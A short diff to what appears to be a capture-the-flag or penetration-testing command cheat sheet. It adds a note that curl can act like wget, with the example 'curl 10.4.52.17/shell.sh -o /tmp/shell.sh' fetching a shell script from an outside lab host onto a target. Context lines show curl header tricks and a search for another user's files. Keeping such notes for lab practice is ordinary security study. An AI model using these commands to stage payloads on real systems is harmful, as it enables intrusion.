@@ -101,6 +101,9 @@ CURL command by using -L (redirect) and -H (use custom header), -k (or) --insecu
 #curl http://10.10.249.163/ -H "User-Agent: C" -L
 #curl --insecure https://bizness.htb | grep href
 
+curl can also be used as wget 
+#curl 10.4.52.17/shell.sh -o /tmp/shell.sh
+
 Find all files that concerns with the user (elyana)
 #find / -type f -user elyana 2>/dev/null
 
